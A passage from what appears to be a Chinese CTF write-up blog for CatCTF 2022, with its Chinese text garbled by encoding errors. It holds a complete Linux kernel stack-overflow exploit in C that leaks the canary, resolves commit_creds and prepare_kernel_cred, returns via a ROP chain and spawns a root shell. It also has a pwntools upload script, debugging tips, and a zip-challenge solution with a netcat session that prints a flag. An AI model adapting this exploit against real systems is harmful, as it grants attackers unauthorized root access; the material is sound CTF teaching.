class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="comment">void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cd0a0;</span></span><br><span class="line"><span class="comment">void (*commit_creds)(void*) KERNCALL = 0xffffffff810ccc30;*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0xccc30</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0xcd0a0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void get()&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">    asm(</span></span><br><span class="line"><span class="comment">        &quot;swapgs;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_ss;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_sp;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_rflags;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_cs;&quot;</span></span><br><span class="line"><span class="comment">        &quot;push $shell;&quot;</span></span><br><span class="line"><span class="comment">        &quot;iretq;&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push $shell;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getshell!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        save_status();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">        <span class="type">int</span> fd;</span><br><span class="line">        fd = open(<span class="string">&quot;/dev/test&quot;</span>, O_RDWR); <span class="comment">//æˆ‘ä»¬çš„è®¾å¤‡æŒ‚è½½åœ¨/dev/testå¤„</span></span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;Failed to open the device...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Open device successful!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">        </span><br><span class="line">        read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">        <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line">        <span class="type">size_t</span> rbp = ((<span class="type">size_t</span> *)buf)[<span class="number">4</span>];</span><br><span class="line">        </span><br><span class="line">        find_symbols();</span><br><span class="line">        <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        rop[<span class="number">2</span>] = canary;</span><br><span class="line">        rop[<span class="number">3</span>] = rbp;</span><br><span class="line">        rop[<span class="number">4</span>] = &amp;get;                 <span class="comment">// rip </span></span><br><span class="line">        write(fd,rop,<span class="number">0x100</span>);</span><br><span class="line">        ioctl(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploit -no-pie -static</span><br></pre></td></tr></table></figure>

<h4 id="ä¸Šä¼ è„šæœ¬-1"><a href="#ä¸Šä¼ è„šæœ¬-1" class="headerlink" title="ä¸Šä¼ è„šæœ¬"></a>ä¸Šä¼ è„šæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">r</span>):</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cd /tmp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    <span class="comment">#os.system(&#x27;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#x27;)</span></span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./exp &gt; ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./startvm.sh&#x27;, shell=True)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12132</span>)</span><br><span class="line"> </span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>

<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>è°ƒè¯•çš„æ—¶å€™æŠŠinitæ–‡ä»¶æ”¹æˆrootç”¨æˆ·ï¼Œåœ¨å¯åŠ¨è„šæœ¬é‚£æŠŠkalsræ”¹æˆnokalsrï¼Œæ–¹ä¾¿è°ƒè¯•ï¼Œå…·ä½“æ“ä½œå¯ä»¥åŠ è½½ç¬¦å·è¡¨é‚£äº›çœ‹æˆ‘çš„mygdbinit</p>
<p>é©±åŠ¨åŠ è½½åœ°å€ç”¨lsmodæŸ¥çœ‹ï¼Œæ‰¾gadgetè‡ªå·±ç”¨ropperæ‰¾å§ï¼Œropgadgetç®—æ˜¯å¯„äº†ã€‚è¿˜æœ‰é¢˜ç›®çš„vmlinuxæå–ç”¨ä¸‹é¢è¿™ä¸ª</p>
<p>å› æ­¤è¿˜æœ‰ä¸€ä¸ªå·¥å…·å¯ä»¥ä½¿ç”¨ï¼š<code>vmlinux-to-elf</code></p>
<blockquote>
<p>ä½¿ç”¨è¿™ä¸ªå·¥å…·ä¹‹å‰ç³»ç»Ÿä¸­å¿…é¡»è£…æœ‰<strong>é«˜äº3.5</strong>ç‰ˆæœ¬çš„python</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPYsudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY# vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>

<p>ä¹‹åè§£å‹å‡ºæ¥çš„ vmlinux å°±æ˜¯å¸¦ç¬¦å·çš„ï¼Œå¯ä»¥æ­£å¸¸è¢« gdb è¯»å–å’Œä¸‹æ–­ç‚¹ã€‚</p>
<p>è°ƒè¯•ç”¨gefï¼Œä¸å¡é¡¿ï¼Œä¸ä¼šæœ‰ç¬¦å·è¡¨é—®é¢˜ï¼Œç”¨å°±å®Œäº‹äº†</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install capstone unicorn keystone-engine ropper</span><br><span class="line">git clone https://github.com/hugsy/gef.git</span><br><span class="line">echo source `pwd`/gef/gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•ç»†èŠ‚é‚£äº›ï¼Œæ‰“æ–­ç‚¹å¾ˆè®²ç©¶ï¼Œå°½é‡ä¸è¦æ‰“åœ¨push rbpä¸Šï¼›ç„¶åç›´æ¥å¤šçœ‹çœ‹å†…æ ¸é©±åŠ¨æŠ¥é”™ï¼Œå¯ä»¥çœ‹è§å‡ºé—®é¢˜çš„åœ°å€ï¼Œå˜ç›¸é€ä¸ªè°ƒè¯•å™¨ï¼ˆä¸æ˜¯ï¼‰</p>
<h3 id="zipğŸ’¼"><a href="#zipğŸ’¼" class="headerlink" title="zipğŸ’¼"></a>zipğŸ’¼</h3><p>åˆ†æå‘ç°æ­¤é¢˜å®ç°çš„zlibå‹ç¼©ï¼Œunzipéœ€è¦è´­ä¹°rootï¼Œrootçš„CDKæ ¹æ®é¢˜ç›®æç¤º</p>
<p>n&#x3D;221 e&#x3D;7ï¼Œå¯ä»¥è”æƒ³åˆ°RSAï¼Œåˆ†æCDKæ£€æµ‹ç®—æ³•å‘ç°3ä¸ªå­—ç¬¦ä¸²ç»“æœçš„æ¯”å¯¹ï¼Œå°è¯•RSAè§£å¯†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">c,e,p,q</span>):</span><br><span class="line">  L=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">  d=gmpy2.invert(e,L)</span><br><span class="line">  n=p*q</span><br><span class="line">  m=gmpy2.powmod(c,d,n)</span><br><span class="line">  flag=<span class="built_in">chr</span>(m)</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  p =  <span class="number">17</span></span><br><span class="line">  q =  <span class="number">13</span></span><br><span class="line">  e =  <span class="number">7</span></span><br><span class="line">  c =  <span class="number">149</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line">  c=<span class="number">108</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line">  c=<span class="number">24</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°CDKå°±æ˜¯HRP</p>
<p>zipå¯ä»¥å‹ç¼©ä»»ä½•æ–‡ä»¶å¹¶æŒ‡å®šå‹ç¼©åæ–‡ä»¶åï¼Œç›´æ¥æŠŠflagæˆ–è€…&#x2F;bin&#x2F;shå‹ç¼©ä¸ºpwnï¼Œæ­¤æ—¶ä¸ä¼šå½±å“ç¨‹åºè¿è¡Œï¼Œå› ä¸ºç¨‹åºæ­¤æ—¶æ²¡æœ‰ç»“æŸæ˜¯è¢«æŒ‚è½½åœ¨procç›®å½•ä¸‹çš„ã€‚</p>
<p>unzipåªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯è¿™é‡Œä¸éš¾å‘ç°unzipå’Œzipéƒ½æ˜¯è¢«mainæ‰€è°ƒç”¨çš„å¹¶ä¸”filenameå˜é‡å¤§å°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåˆ©ç”¨å­å‡½æ•°åŒæ ˆå†…å­˜å¤§å°ç›¸ç­‰ï¼Œåœ¨unzipçš„æ—¶å€™å‘é€Ctrl+D(æ‰‹åŠ¨è¾“å…¥)ï¼Œç¨‹åºå°±ä¼šç»“æŸè¾“å…¥ï¼Œè¿™æ ·unzipçš„é»˜è®¤filenameå°±æ˜¯ä¸Šæ¬¡åœ¨zipè¾“å…¥çš„å‹ç¼©åçš„æ–‡ä»¶åï¼Œä¹Ÿå°±æ˜¯pwnã€‚</p>
<p>ç­‰ä¸‹æ¬¡å†å»ncé¢˜ç›®çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒæŠ¥é”™å¾—åˆ°flagï¼ˆåŒæ–‡ä»¶åè¦†ç›–ä¸å½±å“æƒé™ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">q@ubuntu:~$ nc <span class="number">121.37</span><span class="number">.24</span><span class="number">.208</span> <span class="number">49472</span></span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">3</span></span><br><span class="line">è¯·è¾“å…¥CDKï¼š</span><br><span class="line">HRP</span><br><span class="line"></span><br><span class="line">startâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">1</span></span><br><span class="line">file</span><br><span class="line">flag</span><br><span class="line">zip file</span><br><span class="line">pwn</span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">2</span></span><br><span class="line">zip file</span><br><span class="line">^C</span><br><span class="line">q@ubuntu:~$ nc <span class="number">121.37</span><span class="number">.24</span><span class="number">.208</span> <span class="number">49472</span></span><br><span class="line">./pwn: <span class="number">1</span>: ./pwn: flag&#123;ReT0_fFPeTM0s2VjtU3kN&#125;: not found</span><br></pre></td></tr></table></figure>

<h4 id="éé¢„æœŸ-1"><a href="#éé¢„æœŸ-1" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>æ¦œä¸€å¤§å“¥Esifiel  çš„é¢˜è§£</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_CXtWBWhKkS.png" class="">

<h4 id="æºç -3"><a href="#æºç -3" class="headerlink" title="æºç "></a>æºç </h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -o zip zip.c -lz</span></span><br><span class="line"><span class="type">int</span> uid=<span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> changdu;</span><br><span class="line"><span class="type">int</span> c[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ 